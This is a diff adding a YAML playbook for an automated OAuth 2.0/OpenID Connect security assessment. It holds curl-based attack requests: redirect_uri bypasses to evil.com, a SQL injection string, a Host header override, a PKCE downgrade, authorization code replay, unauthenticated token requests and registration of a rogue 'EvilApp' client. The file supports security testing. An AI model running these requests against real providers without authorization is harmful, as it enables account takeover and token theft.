@@ -1,0 +1,215 @@
+name: "OAuth 2.0 / OpenID Connect Assessment"
+description: "OAuth and OIDC security testing: redirect URI bypass, CSRF, authorization code interception, PKCE downgrade, token revocation, and provider misconfiguration"
+version: "1.0"
+
+vars:
+  client_id: ""
+  redirect_uri: ""
+  auth_endpoint: ""
+  token_endpoint: ""
+  scope: ""
+  state: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "OAuth/OIDC assessment for client {client_id} on {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Endpoint discovery ----
+  - id: discovery
+    name: "OAuth endpoint discovery"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: well_known
+        name: "Fetch .well-known/openid-configuration"
+        tool: curl
+        args: ["-s", "{target}/.well-known/openid-configuration",
+               "-o", "{case_dir}/oauth_wellknown.json"]
+        timeout: 30
+        artifacts: ["{case_dir}/oauth_wellknown.json"]
+
+      - id: jwks_uri
+        name: "Fetch JWKS"
+        tool: curl
+        args: ["-s", "{target}/.well-known/jwks.json",
+               "-o", "{case_dir}/oauth_jwks.json"]
+        timeout: 30
+
+      - id: whatweb
+        name: "Provider fingerprint"
+        tool: whatweb
+        args: ["-a3", "{target}", "--log-verbose", "{case_dir}/whatweb-oauth.txt"]
+        timeout: 60
+
+  # ---- Phase 2: Redirect URI attacks ----
+  - id: redirect_uri
+    name: "Redirect URI manipulation"
+    type: parallel
+    max_workers: 5
+    steps:
+      - id: redirect_open
+        name: "Open redirector in redirect_uri"
+        tool: curl
+        args: ["-s", "-v",
+               "{auth_endpoint}?response_type=code&client_id={client_id}&redirect_uri=https://evil.com/cb&scope={scope}&state=test",
+               "-o", "{case_dir}/oauth_redirect_open.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/oauth_redirect_open.txt"]
+
+      - id: redirect_subdomain
+        name: "Subdomain confusion in redirect_uri"
+        tool: curl
+        args: ["-s", "-v",
+               "{auth_endpoint}?response_type=code&client_id={client_id}&redirect_uri=https://{target}.evil.com/cb&scope={scope}&state=test",
+               "-o", "{case_dir}/oauth_redirect_sub.txt"]
+        timeout: 30
+
+      - id: redirect_path
+        name: "Path traversal in redirect_uri"
+        tool: curl
+        args: ["-s", "-v",
+               "{auth_endpoint}?response_type=code&client_id={client_id}&redirect_uri=https://{target}/callback@evil.com&scope={scope}&state=test",
+               "-o", "{case_dir}/oauth_redirect_path.txt"]
+        timeout: 30
+
+      - id: redirect_sqli
+        name: "SQLi in redirect_uri parameter"
+        tool: curl
+        args: ["-s", "-v",
+               "{auth_endpoint}?response_type=code&client_id={client_id}&redirect_uri=https://{target}/' OR '1'='1&scope={scope}&state=test",
+               "-o", "{case_dir}/oauth_redirect_sqli.txt"]
+        timeout: 30
+
+      - id: redirect_host
+        name: "Host header override in redirect_uri"
+        tool: curl
+        args: ["-s", "-v",
+               "-H", "Host: evil.com",
+               "{auth_endpoint}?response_type=code&client_id={client_id}&redirect_uri=https://{target}/cb&scope={scope}&state=test",
+               "-o", "{case_dir}/oauth_redirect_host.txt"]
+        timeout: 30
+
+  # ---- Phase 3: CSRF / state validation ----
+  - id: csrf_tests
+    name: "CSRF and state parameter validation"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: no_state
+        name: "Omit state parameter"
+        tool: curl
+        args: ["-s", "-v",
+               "{auth_endpoint}?response_type=code&client_id={client_id}&redirect_uri={redirect_uri}&scope={scope}",
+               "-o", "{case_dir}/oauth_no_state.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/oauth_no_state.txt"]
+
+      - id: state_reuse
+        name: "Reuse state across sessions"
+        tool: curl
+        args: ["-s", "-v",
+               "{auth_endpoint}?response_type=code&client_id={client_id}&redirect_uri={redirect_uri}&scope={scope}&state=reusable123",
+               "-o", "{case_dir}/oauth_state_reuse.txt"]
+        timeout: 30
+
+  # ---- Phase 4: Authorization code attacks ----
+  - id: code_attacks
+    name: "Authorization code interception & PKCE tests"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: code_openid
+        name: "Implicit flow / token in fragment"
+        tool: curl
+        args: ["-s", "-v",
+               "{auth_endpoint}?response_type=id_token+token&client_id={client_id}&redirect_uri={redirect_uri}&scope=openid&state=test&nonce=test",
+               "-o", "{case_dir}/oauth_implicit_token.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/oauth_implicit_token.txt"]
+
+      - id: pkce_downgrade
+        name: "PKCE downgrade (omit code_challenge)"
+        tool: curl
+        args: ["-s", "-v",
+               "{auth_endpoint}?response_type=code&client_id={client_id}&redirect_uri={redirect_uri}&scope={scope}&state=test",
+               "-o", "{case_dir}/oauth_pkce_downgrade.txt"]
+        timeout: 30
+
+      - id: code_reuse
+        name: "Authorization code replay"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "grant_type=authorization_code&code=REUSE_ME&redirect_uri={redirect_uri}&client_id={client_id}",
+               "{token_endpoint}",
+               "-o", "{case_dir}/oauth_code_reuse.txt"]
+        timeout: 30
+
+  # ---- Phase 5: Token endpoint attacks ----
+  - id: token_attacks
+    name: "Token endpoint abuse"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: token_client_creds
+        name: "Client credentials grant (no client_secret)"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "grant_type=client_credentials&client_id={client_id}",
+               "{token_endpoint}",
+               "-o", "{case_dir}/oauth_client_creds.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/oauth_client_creds.txt"]
+
+      - id: token_refresh
+        name: "Refresh token without auth"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "grant_type=refresh_token&refresh_token=REFRESH_ME&client_id={client_id}",
+               "{token_endpoint}",
+               "-o", "{case_dir}/oauth_refresh.txt"]
+        timeout: 30
+
+      - id: token_introspection
+        name: "Token introspection (no auth)"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "token=eyJ...&token_type_hint=access_token",
+               "{target}/introspect",
+               "-o", "{case_dir}/oauth_introspect.txt"]
+        timeout: 30
+
+  # ---- Phase 6: Register rogue client ----
+  - id: rogue_client
+    name: "Dynamic client registration"
+    type: conditional
+    condition:
+      any:
+        - contains: "registration_endpoint"
+          ref: well_known
+    then:
+      - id: register_rogue
+        name: "Register malicious client"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/json",
+               "-d", '{"client_name":"EvilApp","redirect_uris":["https://evil.com/cb"],"grant_types":["authorization_code","refresh_token"]}',
+               "{target}/register",
+               "-o", "{case_dir}/oauth_rogue_client.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/oauth_rogue_client.txt"]
+
+  # ---- Phase 7: Report ----
+  - id: report
+    name: "OAuth assessment note"
+    type: log
+    message: |
+      OAuth/OIDC assessment complete for client {client_id}.
+      Results in {case_dir}/:
+      - Discovery: oauth_wellknown.json, oauth_jwks.json
+      - Redirect URI: oauth_redirect_open.txt, oauth_redirect_sub.txt, oauth_redirect_path.txt
+      - CSRF: oauth_no_state.txt, oauth_state_reuse.txt
+      - Code attacks: oauth_implicit_token.txt, oauth_pkce_downgrade.txt, oauth_code_reuse.txt
+      - Token: oauth_client_creds.txt, oauth_refresh.txt, oauth_introspect.txt
+      - Rogue client: oauth_rogue_client.txt
